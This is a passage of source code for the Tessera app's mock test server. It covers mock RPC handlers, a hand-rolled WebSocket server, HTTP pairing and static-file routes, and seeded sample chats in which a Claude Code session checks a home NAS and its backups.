      const id = String(need(p, 'board_id'));
      const b = state.boards.get(id);
      if (!b) throw notFound('that web view is gone');
      if (!b.host) return b;
      const moved = { ...b, version: b.version + 1, updated_at: now() };
      delete moved.host;
      state.boards.set(id, moved);
      BROWSER.attached.delete(id);
      broadcast({ type: 'board_updated', board: moved });
      return moved;
    },
    browser_show_on_screen(p) {
      const id = String(need(p, 'board_id'));
      const b = state.boards.get(id);
      if (!b) throw notFound('that web view is gone');
      if (!b.host) throw badRequest('this web view runs on the server, which has no screen to show it on. Open the page in your own browser instead (sign-ins there stay in that browser), or open web views on one of your computers (Web views here)');
      const down = machineDown(b.host);
      if (down) throw badRequest(down);
      state.onScreen ??= new Set();
      if (p.show === false) {
        state.onScreen.delete(id);
        pushFrame(id);
      } else state.onScreen.add(id);
      return null;
    },
    mock_browser_check(p) {
      const t = BROWSER.tabs.get(String(need(p, 'board_id')));
      if (!t) throw notFound('no tab for that board');
      t.check = !!p.check;
      tabChanged(t);
      return tabInfo(t);
    },
    mock_screen_closed(p) {
      const id = String(need(p, 'board_id'));
      state.onScreen?.delete(id);
      pushFrame(id);
      return null;
    },
    browser_attach(p, conn) {
      const b = state.boards.get(String(p.board_id ?? ''));
      const down = b?.host ? machineDown(b.host) : null;
      if (down) throw badRequest(down);
      return attach(p, conn);
    },
    mock_machines(p = {}, conn) {
      if (p.me && conn) {
        const t = now();
        const id = conn.deviceId;
        state.machines = machinesState().filter((x) => x.id !== id);
        state.machines.push({
          id, name: String(p.me.name ?? 'Desktop'), os: 'linux x86_64', online: p.me.online !== false, last_seen: t, paused: false, version: '0.1.0',
          sandbox: 'on (namespaces + Landlock)', sandbox_ok: true, running: 0, preset: 'full_access', home: HOME,
          scope: { folders: [{ path: HOME, write: true }], commands: true, ask: 'risky', timeout_secs: 300, ...(p.me.webviews === false ? {} : { webviews: true }) },
          recent: [],
        });
      }
      return mockMachines(p, conn);
    },
    mock_web_host(p) {
      const id = String(need(p, 'board_id'));
      const b = state.boards.get(id);
      if (!b) throw notFound(`no whiteboard \`${id}\``);
      const next = { ...b, version: b.version + 1 };
      if (p.host) next.host = String(p.host);
      else delete next.host;
      state.boards.set(id, next);
      broadcast({ type: 'board_updated', board: next });
      return next;
    },
  });
}
// ─── end of NODE-WV mock handlers ──────────────────────────────────────────────

// ─── COMPOSER mock handlers (contract 6 §2: a status line that never sticks) ───
// `mock_composer { mute?: { session_id, on }, slow_snapshots?: ms, resync?: true, stall?: session_id }` (tests):
// - mute: that chat's events reach no one (lost on the way) until unmuted;
// - slow_snapshots: `get_session` answers this many ms late, with the state from when it was asked (a
//   snapshot crossing paths with a turn's last events);
// - resync: every client hears `resync` (the server dropped events for it);
// - stall: a turn starts (the status line stays quiet: no text) and is over on the server without anyone hearing it end.
// Returns { muted, slow_snapshots }. `/__mock/reset` clears it all.
const composerMock = () => (state.composer ??= { muted: new Set(), delay: 0 });
{
  const deliver = broadcast;
  broadcast = (event) => {
    const sid = event?.session_id ?? (event?.type === 'session_updated' ? event.session?.id : undefined);
    if (sid && state.composer?.muted.has(sid)) return;
    deliver(event);
  };
  for (const method of ['get_session', 'get_session_page']) {
    const getSession = handlers[method];
    handlers[method] = (p, conn) => {
      const snap = getSession(p, conn);
      const delay = state.composer?.delay ?? 0;
      if (!delay) return snap;
      const then = JSON.parse(JSON.stringify(snap));
      return new Promise((resolve) => later(delay, () => resolve(then)));
    };
  }
}
Object.assign(handlers, {
  mock_composer(p = {}) {
    const c = composerMock();
    if (p.mute) {
      const id = getRec({ session_id: p.mute.session_id }).info.id;
      if (p.mute.on) c.muted.add(id);
      else c.muted.delete(id);
    }
    if (typeof p.slow_snapshots === 'number') c.delay = Math.max(0, Math.min(20_000, p.slow_snapshots));
    if (p.resync) broadcast({ type: 'resync' });
    if (p.stall) {
      const rec = getRec({ session_id: p.stall });
      if (rec.turn || rec.info.status !== 'idle') throw badRequest('that chat is busy');
      setStatus(rec, 'running');
      broadcast({ type: 'stream_started', session_id: rec.info.id, model: rec.info.model });
      rec.info.status = 'idle'; // over, and nobody was told
    }
    return { muted: [...c.muted], slow_snapshots: c.delay };
  },
});
// ─── end of COMPOSER mock handlers ───────────────────────────────────────────

// ─── HARNESS mock handlers (contract 7 item 11: what the agent said never vanishes) ───
// `mock_harness { narrate: session_id, gap?: ms }` (tests) plays a turn whose words sit between its tool
// calls, as GPT-style models write them, with a subagent's report and a notice arriving mid-turn; each
// step `gap` ms (default 400) apart. `{ compacting: session_id, after: ms, for: ms }`: the chat works
// `after` ms, compacts `for` ms, then goes idle. Returns { ok: true } at once; the turn plays out after.
Object.assign(handlers, {
  mock_harness(p = {}) {
    const gap = Math.max(50, Math.min(5000, p.gap ?? 400));
    if (p.compacting) {
      const rec = getRec({ session_id: p.compacting });
      if (rec.turn || rec.info.status !== 'idle') throw badRequest('that chat is busy');
      setStatus(rec, 'running');
      later(Math.max(0, p.after ?? 3000), () => {
        setStatus(rec, 'compacting');
        later(Math.max(0, p.for ?? 2000), () => setStatus(rec, 'idle'));
      });
      return { ok: true };
    }
    if (!p.narrate) throw badRequest('narrate or compacting');
    const rec = getRec({ session_id: p.narrate });
    if (rec.turn || rec.info.status !== 'idle') throw badRequest('that chat is busy');
    const sid = rec.info.id;
    const model = rec.info.model;
    const usage = zeroUsage();
    let n = 0;
    const call = (name, args) => ({ type: 'tool_call', id: `call_h${hex(4)}_${++n}`, name, arguments: args });
    /** Stream `text` then `calls`, then commit them as one assistant entry and run the calls. */
    const reply = (text, calls, stop) => {
      broadcast({ type: 'stream_started', session_id: sid, model });
      let i = 0;
      if (text) {
        for (const w of text.match(/\S+\s*/g)) broadcast({ type: 'stream_delta', session_id: sid, delta: { part: 'text', index: 0, text: w } });
        i = 1;
      }
      for (const c of calls) broadcast({ type: 'stream_delta', session_id: sid, delta: { part: 'tool_call', index: i++, id: c.id, name: c.name, arguments: JSON.stringify(c.arguments) } });
      broadcast({ type: 'stream_ended', session_id: sid });
      addEntry(rec, { kind: 'assistant', content: [...(text ? [{ type: 'text', text }] : []), ...calls], model, usage, stop: stop ?? (calls.length ? 'tool_use' : 'stop') });
      for (const c of calls) broadcast({ type: 'tool_started', session_id: sid, call_id: c.id, name: c.name });
    };
    const results = (calls, out = 'ok') => {
      for (const c of calls) addEntry(rec, { kind: 'tool_result', call_id: c.id, tool: c.name, content: [{ type: 'text', text: out }], is_error: false });
    };
    const a = [call('read', { path: 'src/parse.rs' })];
    const b = [call('bash', { command: 'cargo test parse' }), call('grep', { pattern: 'parse_line', path: 'src' })];
    const c = [call('edit', { path: 'src/parse.rs', replace: [] }), call('bash', { command: 'cargo test' })];
    const steps = [
      () => setStatus(rec, 'running'),
      () => reply('Found it: the parser skips the last line when the file has no trailing newline.', a),
      () => results(a, 'fn parse_line(…)'),
      () => reply('', b),
      () => results(b),
      () => addEntry(rec, { kind: 'user', content: [{ type: 'text', text: '[Report from subagent "callers" · 3 steps · 1 min · session ses_9a8b7c6d5e4f]\n\nNo other callers depend on the old behaviour.' }], author: 'subagent:ses_9a8b7c6d5e4f' }),
      () => reply('Fixed the off-by-one; all 14 parser tests pass now.', c),
      () => results(c, 'test result: ok. 14 passed'),
      () => addEntry(rec, { kind: 'notice', level: 'info', text: 'Context trimmed: older tool output was replaced with references (~12k tokens freed). The originals remain retrievable.' }),
      () => reply('Done: the parser keeps the last line.', []),
      () => setStatus(rec, 'idle'),
    ];
    steps.forEach((f, i) => later(gap * (i + 1), f));
    return { ok: true };
  },
});
// ─── end of HARNESS mock handlers ────────────────────────────────────────────

// ─── WebSocket (RFC 6455, server side) ──────────────────────────────────────
let connCounter = 0;
class WsConn {
  constructor(socket, { token, deviceId }) {
    this.id = ++connCounter;
    this.socket = socket;
    this.token = token;
    this.deviceId = deviceId;
    this.client = '';
    this.buf = Buffer.alloc(0);
    this.fragOpcode = 0;
    this.frags = [];
    this.fragSize = 0;
    this.closeSent = false;
    this.dead = false;
    socket.setNoDelay(true);
    socket.on('data', (chunk) => this.onData(chunk));
    socket.on('end', () => { socket.end(); this.cleanup(); });
    socket.on('close', () => this.cleanup());
    socket.on('error', () => this.cleanup());
    this.pingTimer = setInterval(() => this.writeFrame(0x9, Buffer.alloc(0)), 30_000);
  }
  onData(chunk) {
    if (this.dead) return;
    this.buf = this.buf.length ? Buffer.concat([this.buf, chunk]) : chunk;
    while (!this.dead && this.parseFrame());
  }
  /** Parses one complete frame from the buffer; false when more bytes are needed. */
  parseFrame() {
    const b = this.buf;
    if (b.length < 2) return false;
    const fin = (b[0] & 0x80) !== 0;
    const rsv = b[0] & 0x70;
    const opcode = b[0] & 0x0f;
    const masked = (b[1] & 0x80) !== 0;
    let len = b[1] & 0x7f;
    let off = 2;
    if (len === 126) {
      if (b.length < 4) return false;
      len = b.readUInt16BE(2); off = 4;
    } else if (len === 127) {
      if (b.length < 10) return false;
      const big = b.readBigUInt64BE(2);
      if (big > BigInt(MAX_MESSAGE)) return this.fail(1009, 'message too big');
      len = Number(big); off = 10;
    }
    if (rsv) return this.fail(1002, 'unexpected RSV bits');
    if (!masked) return this.fail(1002, 'client frames must be masked');
    if (b.length < off + 4 + len) return false;
    const mask = b.subarray(off, off + 4);
    const payload = Buffer.from(b.subarray(off + 4, off + 4 + len));
    for (let i = 0; i < payload.length; i++) payload[i] ^= mask[i & 3];
    this.buf = b.subarray(off + 4 + len);
    this.onFrame(fin, opcode, payload);
    return true;
  }
  onFrame(fin, opcode, payload) {
    if (opcode >= 0x8) {
      if (!fin || payload.length > 125) return this.fail(1002, 'bad control frame');
      if (opcode === 0x8) { // close: echo the status code, then end
        if (!this.closeSent) {
          const code = payload.length >= 2 ? payload.readUInt16BE(0) : 0;
          this.writeFrame(0x8, code && code !== 1005 && code !== 1006 ? payload.subarray(0, 2) : Buffer.alloc(0));
          this.closeSent = true;
        }
        this.socket.end();
        this.cleanup();
      } else if (opcode === 0x9) {
        this.writeFrame(0xa, payload); // pong
      } else if (opcode !== 0xa) {
        this.fail(1002, 'unknown control opcode');
      }
      return;
    }
    if (opcode === 0x0) {
      if (!this.fragOpcode) return this.fail(1002, 'unexpected continuation frame');
    } else if (opcode === 0x1 || opcode === 0x2) {
      if (this.fragOpcode) return this.fail(1002, 'expected continuation frame');
      this.fragOpcode = opcode;
    } else {
      return this.fail(1002, 'unknown opcode');
    }
    this.frags.push(payload);
    this.fragSize += payload.length;
    if (this.fragSize > MAX_MESSAGE) return this.fail(1009, 'message too big');
    if (!fin) return;
    const message = this.frags.length === 1 ? this.frags[0] : Buffer.concat(this.frags);
    const op = this.fragOpcode;
    this.fragOpcode = 0; this.frags = []; this.fragSize = 0;
    if (op === 0x1) this.onMessage(message.toString('utf8'));
    else this.send({ id: 0, error: { code: 'bad_request', message: 'binary frames are not supported' } });
  }
  onMessage(raw) {
    let msg;
    try { msg = JSON.parse(raw); } catch { return this.send({ id: 0, error: { code: 'bad_request', message: 'invalid JSON' } }); }
    const id = typeof msg?.id === 'number' ? msg.id : 0;
    const method = msg?.method;
    const handler = typeof method === 'string' && Object.hasOwn(handlers, method) ? handlers[method] : null;
    if (!handler) return this.send({ id, error: { code: 'bad_request', message: `unknown method \`${method}\`` } });
    if (!QUIET) log(`ws#${this.id} → ${method}${msg.params?.session_id ? ` ${msg.params.session_id}` : ''}`);
    const params = msg.params && typeof msg.params === 'object' && !Array.isArray(msg.params) ? msg.params : {};
    const fail = (err) => {
      if (err instanceof RpcError) this.send({ id, error: { code: err.code, message: err.message } });
      else {
        console.error(`[mock] ${method} failed:`, err);
        this.send({ id, error: { code: 'internal', message: String(err?.message ?? err) } });
      }
    };
    try {
      privateGuard(params, this);
      const result = handler(params, this);
      if (result && typeof result.then === 'function') {
        result.then((r) => this.send({ id, result: r === undefined ? null : privateFilter(method, r, this) }), fail);
        return;
      }
      this.send({ id, result: result === undefined ? null : privateFilter(method, result, this) });
    } catch (err) {
      fail(err);
    }
  }
  send(obj) {
    this.sendRaw(Buffer.from(JSON.stringify(obj)));
  }
  sendRaw(data) {
    if (!this.closeSent) this.writeFrame(0x1, data);
  }
  writeFrame(opcode, payload) {
    if (this.dead || this.socket.destroyed || !this.socket.writable) return;
    const len = payload.length;
    let header;
    if (len < 126) {
      header = Buffer.from([0x80 | opcode, len]);
    } else if (len < 65536) {
      header = Buffer.alloc(4); header[0] = 0x80 | opcode; header[1] = 126; header.writeUInt16BE(len, 2);
    } else {
      header = Buffer.alloc(10); header[0] = 0x80 | opcode; header[1] = 127; header.writeBigUInt64BE(BigInt(len), 2);
    }
    this.socket.write(Buffer.concat([header, payload]));
  }
  close(code = 1000, reason = '') {
    if (this.dead || this.closeSent) return;
    const r = Buffer.from(reason);
    const payload = Buffer.alloc(2 + r.length);
    payload.writeUInt16BE(code, 0);
    r.copy(payload, 2);
    this.writeFrame(0x8, payload);
    this.closeSent = true;
    this.closeTimer = setTimeout(() => this.destroy(), 2000); // client did not answer the close
  }
  fail(code, reason) {
    log(`ws#${this.id} protocol error: ${reason}`);
    this.close(code, reason);
    this.buf = Buffer.alloc(0);
    this.dead = true; // ignore further input; socket is torn down by the close timer or the peer
    clients.delete(this);
    return false;
  }
  destroy() {
    this.socket.destroy();
    this.cleanup();
  }
  cleanup() {
    clearInterval(this.pingTimer);
    clearTimeout(this.closeTimer);
    if (!clients.delete(this) && this.dead) return;
    this.dead = true;
    for (const gone of connGone) gone(this);
    log(`ws#${this.id} closed (${clients.size} open)`);
  }
}

function customHeaders(req) {
  return Object.entries(req.headers)
    .filter(([k]) => k.startsWith('cf-access-') || (k.startsWith('x-') && !k.startsWith('x-forwarded-')))
    .map(([k, v]) => `${k}=${/secret|token|key/i.test(k) ? '***' : v}`)
    .join(' ');
}
function handleUpgrade(req, socket, head) {
  const url = new URL(req.url ?? '/', 'http://localhost');
  const reject = (status, body) => {
    socket.end(`HTTP/1.1 ${status}\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: ${Buffer.byteLength(body)}\r\n\r\n${body}`, () => socket.destroy());
  };
  socket.on('error', () => {});
  if (url.pathname !== '/api/ws') return reject('404 Not Found', '{"code":"not_found","message":"no such endpoint"}');
  const hdrs = customHeaders(req);
  if (hdrs) log(`ws upgrade custom headers: ${hdrs}`);
  const auth = req.headers.authorization ?? '';
  const token = url.searchParams.get('token') || (auth.toLowerCase().startsWith('bearer ') ? auth.slice(7).trim() : '');
  if (!token.startsWith('tok_') || revokedTokens.has(token)) {
    log(`ws upgrade rejected (${token ? 'bad or revoked token' : 'no token'})`);
    return reject('401 Unauthorized', '{"code":"unauthorized","message":"Missing or invalid device token"}');
  }
  const key = req.headers['sec-websocket-key'];
  if (!key || String(req.headers.upgrade).toLowerCase() !== 'websocket') return reject('400 Bad Request', '{"code":"bad_request","message":"expected a WebSocket upgrade"}');
  if (req.headers['sec-websocket-version'] !== '13') {
    socket.end('HTTP/1.1 426 Upgrade Required\r\nSec-WebSocket-Version: 13\r\nConnection: close\r\nContent-Length: 0\r\n\r\n');
    return;
  }
  const accept = crypto.createHash('sha1').update(key + WS_GUID).digest('base64');
  socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${accept}\r\n\r\n`);
  const mapped = tokenDevices.get(token);
  const deviceId = mapped && state.devices.some((d) => d.id === mapped) ? mapped : 'dev_local';
  const device = state.devices.find((d) => d.id === deviceId);
  if (device) device.last_seen = now();
  const conn = new WsConn(socket, { token, deviceId });
  clients.add(conn);
  log(`ws#${conn.id} open (device ${device?.name ?? deviceId}, ${clients.size} open)`);
  if (head?.length) conn.onData(head);
}

// ─── HTTP ───────────────────────────────────────────────────────────────────
const CORS = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': '*', 'Access-Control-Allow-Methods': 'GET,POST,OPTIONS' };
const MIME = {
  '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.mjs': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8', '.svg': 'image/svg+xml', '.png': 'image/png', '.ico': 'image/x-icon',
  '.json': 'application/json; charset=utf-8', '.woff2': 'font/woff2', '.woff': 'font/woff',
  '.webmanifest': 'application/manifest+json', '.txt': 'text/plain; charset=utf-8', '.map': 'application/json; charset=utf-8',
  '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.webp': 'image/webp',
};
function sendJson(res, status, body, extra = {}) {
  const data = JSON.stringify(body);
  res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8', 'Content-Length': Buffer.byteLength(data), 'Cache-Control': 'no-store', ...CORS, ...extra });
  res.end(data);
}
function readBody(req, limit = 1 << 20) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on('data', (c) => {
      size += c.length;
      if (size > limit) { reject(new Error('body too large')); req.destroy(); } else chunks.push(c);
    });
    req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
    req.on('error', reject);
  });
}
async function handlePair(req, res) {
  const hdrs = customHeaders(req);
  if (hdrs) log(`pair custom headers: ${hdrs}`);
  let body;
  try { body = JSON.parse(await readBody(req)); } catch { return sendJson(res, 400, { code: 'bad_request', message: 'Body must be JSON: { code, device_name }' }); }
  const code = String(body?.code ?? '').replace(/\D/g, '');
  const t = now();
  for (const [c, pc] of state.pairingCodes) if (pc.expires_at <= t) state.pairingCodes.delete(c);
  const minted = state.pairingCodes.get(code);
  if (code !== '123456' && code !== '12345678' && !minted) {
    log(`pair rejected (code ${code || '<empty>'})`);
    return sendJson(res, 401, { code: 'unauthorized', message: 'Invalid or expired pairing code' });
  }
  if (minted) state.pairingCodes.delete(code); // single-use
  const device = { id: `dev_${hex(6)}`, name: String(body?.device_name ?? '').trim() || 'Unnamed device', created_at: t, last_seen: t, current: false };
  state.devices.push(device);
  const token = `tok_${hex(24)}`;
  tokenDevices.set(token, device.id);
  log(`paired "${device.name}" as ${device.id}`);
  return sendJson(res, 200, { token, device_id: device.id, server: state.serverInfo });
}
const statFile = (f) => { try { return fs.statSync(f); } catch { return null; } };
function serveStatic(req, res, pathname) {
  const plain = (status, text) => {
    res.writeHead(status, { 'Content-Type': 'text/plain; charset=utf-8', 'Cache-Control': 'no-cache' });
    res.end(text);
  };
  const root = path.resolve(DIST_DIR);
  if (!statFile(root)?.isDirectory()) {
    return plain(404, `Tessera mock server is running, but the UI is not built (${root} not found).\n` +
      'Run `npm run build` in apps/tessera/ui, or use `npm run dev` (Vite proxies /api to this server).\n');
  }
  let rel;
  try { rel = decodeURIComponent(pathname); } catch { return plain(400, 'Bad request\n'); }
  if (rel.includes('\0')) return plain(400, 'Bad request\n');
  let file = path.resolve(root, '.' + path.posix.normalize('/' + rel));
  if (file !== root && !file.startsWith(root + path.sep)) return plain(403, 'Forbidden\n');
  let st = statFile(file);
  if (st?.isDirectory()) { file = path.join(file, 'index.html'); st = statFile(file); }
  if (!st?.isFile()) {
    const ext = path.extname(rel);
    if (ext && ext !== '.html') return plain(404, 'Not found\n');
    file = path.join(root, 'index.html'); // SPA fallback
    st = statFile(file);
    if (!st?.isFile()) return plain(404, 'dist/index.html is missing; run `npm run build`.\n');
  }
  const isIndex = path.basename(file) === 'index.html';
  res.writeHead(200, {
    'Content-Type': MIME[path.extname(file).toLowerCase()] ?? 'application/octet-stream',
    'Content-Length': st.size,
    'Cache-Control': !isIndex && rel.startsWith('/assets/') ? 'public, max-age=31536000, immutable' : 'no-cache',
    // The same policy the real server sends with its web UI (crates/server `csp`),
    // so tests of the built app catch what it forbids (e.g. fetch("data:…")).
    ...(isIndex ? { 'Content-Security-Policy': appCsp(fs.readFileSync(file, 'utf8')) } : {}),
  });
  if (req.method === 'HEAD') return res.end();
  fs.createReadStream(file).on('error', () => res.destroy()).pipe(res);
}
/** crates/server's web UI policy: inline scripts only by hash, no data: fetches. */
function appCsp(html) {
  const hashes = [...html.matchAll(/<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/g)]
    .map((m) => ` 'sha256-${crypto.createHash('sha256').update(m[1]).digest('base64')}'`).join('');
  return `default-src 'self'; script-src 'self'${hashes}; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; media-src 'self' blob:; connect-src 'self' http: https: ws: wss:; frame-src 'self' http: https:; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'`;
}
// ACCOUNTS: a subscription's entry says which service it is ("Work" → "ChatGPT (Work)").
const accountLabel = (kind, name) => {
  const service = kind === 'openai_codex' ? 'ChatGPT' : kind === 'claude_code' ? 'Claude' : null;
  return !service || name.toLowerCase().includes(service.toLowerCase()) ? name : `${service} (${name})`;
};
// Another Claude account: its own folder, signed in by the user through Claude Code (`POST /__mock/claude-account
// ?id=…&state=ready|signed_out` plays them signing in; "Check again" then finds it).
const claudeAccountDir = (id) => `/home/ann/.local/share/tessera-claude/${id}`;
function claudeAccountInfo(prov) {
  const run = `CLAUDE_CONFIG_DIR='${claudeAccountDir(prov.id)}' claude`;
  const base = { installed: true, command: '/home/ann/.local/bin/claude', version: '2.1.284', provider: prov.id, sign_in: run };
  if (!prov.authenticated) return { ...base, signed_in: false, api_key: false, hint: `Sign this account in by running \`${run}\` once in a terminal on homelab (as the user Tessera runs as) and logging in with that Claude Pro or Max account. Then press Check again.` };
  return { ...base, signed_in: true, plan: 'pro', account: prov.account ?? 'work@example.com', api_key: false, hint: 'Ready: chats can use this account\'s models, with Tessera\'s notes, whiteboards, memory and other tools built in.' };
}
function markClaudeAccount(prov, ready) {
  prov.authenticated = ready;
  if (ready) prov.account = prov.account ?? 'work@example.com';
  else delete prov.account;
  broadcast({ type: 'providers_changed' });
}

// CLAUDE-CODE: what `claude_code_status` reports (see POST /__mock/claude-code). The server names
// the computer it runs on in its hints ("homelab" here).
let claudeCodeState = 'missing';
function claudeCodeInfo() {
  const st = claudeCodeState;
  if (st === 'missing') return { installed: false, signed_in: false, api_key: false, hint: 'Install Claude Code on homelab, the computer running Tessera (https://code.claude.com/docs/en/setup), then sign in by running `claude` once there.' };
  const base = { installed: true, command: '/home/ann/.local/bin/claude', version: '2.1.284' };
  if (st === 'signed_out') return { ...base, signed_in: false, api_key: false, hint: 'Sign in by running `claude` once in a terminal on homelab (as the user Tessera runs as) and logging in with your Claude Pro or Max account. Then press Check again.' };
  if (st === 'api_key') return { ...base, signed_in: true, api_key: true, account: 'ann@example.com', hint: 'Claude Code here is signed in with an API key, so its use is billed per token; run `claude`, then `/login`, to use your Pro or Max plan instead.' };
  return { ...base, signed_in: true, plan: 'max', account: 'ann@example.com', api_key: false, hint: 'Ready: chats can use a “Claude (your subscription)” model, with Tessera\'s notes, whiteboards, memory and other tools built in.' };
}

// CLAUDE-CODE: a chat run by the user's own Claude Code. Tessera's tools reached it over the bridge, so
// they are stored (and shown) under their own names — `bash` with a stored credential, `note`, `notify` —
// beside Claude Code's own subagents: an older `Task` (its `details.subagent` card only) and an `Agent` whose
// subagent has a session of its own (`parent_call`), shown like Tessera's subagents.
const CLAUDE_CHAT_ID = 'ses_cc4b2e81d9f3';
const CLAUDE_HELPER_ID = 'ses_cc9d1f60a7e2';
function seedClaudeCodeChat({ today, S }) {
  const claude = { provider: 'claude-code', model: 'sonnet' };
  return [
    S({
      id: CLAUDE_CHAT_ID, title: 'Homelab sweep on Claude', model: claude, created: today(70 * MIN), updated: today(64 * MIN),
      items: [
        U('Sweep the homelab: check the NAS, have the logs looked at, write it up as a note and ping me when done.'),
        A("I'll check the NAS with your stored login first.", CALL('toolu_cc01', 'bash', { command: 'curl -s -u "admin:$NAS_PASSWORD" https://nas.lan/api/health' })),
        R('toolu_cc01', 'bash', '{"status":"ok","disks":4,"degraded":0,"temp_c":38}\n[exit 0 · 0.4s]', { details: { exit_code: 0 } }),
        A('The NAS is healthy. A subagent can read the logs meanwhile.', CALL('toolu_cc02', 'Task', { description: 'Review the NAS logs', prompt: 'Read the NAS logs from the last week and list warnings and errors with their times.', subagent_type: 'Explore' })),
        R('toolu_cc02', 'Task', 'Two warnings in the last week:\n- Tue 03:12 SMART: disk 3 reallocated sectors 8 → 12\n- Thu 22:40 scrub took 4 h 10 min (usually 3 h)', { details: { subagent: { type: 'Explore', description: 'Review the NAS logs', background: false, tool_uses: 6, tokens: 18200, duration_ms: 42000, status: 'completed' } } }),
        A('Writing it up.', CALL('toolu_cc03', 'note', { action: 'create', title: 'Homelab sweep', content: '# Homelab sweep\n\n- NAS: ok, 4 disks, 38 °C\n- Disk 3: reallocated sectors 8 → 12 (watch it)\n- Scrub slower than usual' })),
        R('toolu_cc03', 'note', 'Created note nt_cc7h2k9d "Homelab sweep" (version 1).'),
        A(CALL('toolu_cc04', 'notify', { title: 'Homelab sweep done', body: 'NAS ok; disk 3 is worth watching.' })),
        R('toolu_cc04', 'notify', 'Sent to your devices.', { details: { notification: 41 } }),
        A('One more check: the backups.', CALL('toolu_cc05', 'Agent', { description: 'Check the backups', prompt: "Check that last night's backups finished and say how big they were.", subagent_type: 'general-purpose' })),
        R('toolu_cc05', 'Agent', "Last night's backup finished at 02:14: 38 GB, no errors.", { details: {
          subagent: { type: 'general-purpose', description: 'Check the backups', background: false, tool_uses: 1, tokens: 5200, duration_ms: 9000, status: 'completed' },
          subagents: [{ name: 'Check the backups', session_id: CLAUDE_HELPER_ID, background: false }],
        } }),
        A('Done. The NAS is fine; disk 3 has a few more reallocated sectors than last week, so it is in the note as one to watch. Last night\'s backup finished (38 GB). I sent you a notification.'),
        // Claude Stop additionalContext has no preceding harness user entry.
        A('✓'),
        { ...A('Done ✓'), author: 'harness:completion' },
      ],
    }),
    S({
      id: CLAUDE_HELPER_ID, title: '↳ Check the backups', kind: 'subagent', parent_id: CLAUDE_CHAT_ID, parent_call: 'toolu_cc05', helper_owner: 'claude_code', role: 'general-purpose',
      model: claude, created: today(65 * MIN), updated: today(64.8 * MIN),
      items: [
        U("Check that last night's backups finished and say how big they were."),
        A('Reading the backup log.', CALL('toolu_cch1', 'Bash', { command: 'tail -n 20 /var/log/backup.log', description: 'Read the backup log' })),
        R('toolu_cch1', 'Bash', '02:14 backup finished · 38 GB · 0 errors'),
        A("Last night's backup finished at 02:14: 38 GB, no errors."),
        A('✓'),
      ],
    }),
  ];
}
async function handleHttp(req, res) {
  const url = new URL(req.url ?? '/', 'http://localhost');
  const p = url.pathname;
  const isApi = p.startsWith('/api/') || p.startsWith('/__mock/');
  if (isApi && req.method === 'OPTIONS') {
    const asked = req.headers['access-control-request-headers'];
    res.writeHead(204, { ...CORS, 'Access-Control-Allow-Headers': asked ? `*, ${asked}` : '*', 'Access-Control-Max-Age': '600' });
    return res.end();
  }
  if (p === '/api/health' && (req.method === 'GET' || req.method === 'HEAD')) return sendJson(res, 200, { name: 'tessera', version: VERSION, protocol: 1 });
  if (p === '/api/pair') return req.method === 'POST' ? handlePair(req, res) : sendJson(res, 405, { code: 'bad_request', message: 'Use POST' });
  if (p === '/api/ws') return sendJson(res, 426, { code: 'bad_request', message: 'Expected a WebSocket upgrade' }, { Upgrade: 'websocket' });
  if (p === '/__mock/drop' && req.method === 'POST') {
    const hard = url.searchParams.has('hard');
    const n = clients.size;
    for (const c of [...clients]) (hard ? c.destroy() : c.close(1012, 'mock drop'));
    log(`dropped ${n} WebSocket connection(s)${hard ? ' (hard)' : ''}`);
    return sendJson(res, 200, { dropped: n });
  }
  if (p === '/__mock/reset' && req.method === 'POST') {
    const fresh = ['1', 'true', ''].includes(url.searchParams.get('fresh') ?? 'no');
    resetState(fresh);
    // A truly clean install has only the unsigned-in built-in preset, no
    // reachable local model servers and no conversations.
    if (url.searchParams.get('unconfigured') === '1') {
      state.setupCompleted = false;
      state.serverInfo.default_model = null;
      state.providers = state.providers.filter((x) => x.kind === 'openai_codex').slice(0, 1);
      for (const prov of state.providers) {
        prov.authenticated = false;
        prov.models = [mkModel(prov.id, 'gpt-6-astra', 'gpt-6-astra', 272000, 128000, true, true)];
      }
      state.providerKeys.clear();
      state.sessions.clear();
      state.noLocalModels = true;
    }
    BROWSER.tabs.clear(); BROWSER.attached.clear(); BROWSER.log.length = 0; BROWSER.frames = 0; BROWSER.acks = 0;
    log(fresh ? 'state reset to a first run (setup not completed, no model)' : 'state reset to seed');
    return sendJson(res, 200, { ok: true, sessions: state.sessions.size, fresh });
  }
  if (p === '/__mock/mosaics/touch' && req.method === 'POST') { // another device changed the layout
    const layout = clone(state.mosaics);
    if (layout.mosaics.length) layout.mosaics[0].name = `${layout.mosaics[0].name} ·`;
    else {
      const recent = [...state.sessions.values()].map((r) => r.info)
        .filter((i) => !i.private && !i.archived && i.kind !== 'subagent').sort((a, b) => b.updated_at - a.updated_at)[0];
      layout.mosaics.push({ id: `mos_${hex(4)}`, name: 'From Pixel Fold', layout: 'dwindle', tiles: [{ id: `tile_${hex(4)}`, ...(recent ? { session_id: recent.id } : {}) }] });
    }
    layout.version = state.mosaics.version + 1;
    log(`mosaics touched (version ${layout.version})`);
    return sendJson(res, 200, setMosaics(layout));
  }
  if (p === '/__mock/usage-row' && req.method === 'POST') { // a model request at an exact instant (usage days)
    let b = {};
    try { b = JSON.parse((await readBody(req)) || '{}'); } catch { return sendJson(res, 400, { code: 'bad_request', message: 'Body must be JSON' }); }
    if (!Number.isFinite(b.ts)) return sendJson(res, 400, { code: 'bad_request', message: 'ts (unix ms) is required' });
    (state.usageRows ??= []).push({ ts: b.ts, provider: b.provider ?? 'openrouter', model: b.model ?? 'mistralai/mistral-small-3.2', kind: b.kind ?? 'chat', input: b.input ?? 1000, output: b.output ?? 100 });
    return sendJson(res, 200, { ok: true, rows: state.usageRows.length });
  }
  if (p === '/__mock/claude-account' && req.method === 'POST') { // ACCOUNTS: the user signed another Claude account in (or out) in Claude Code
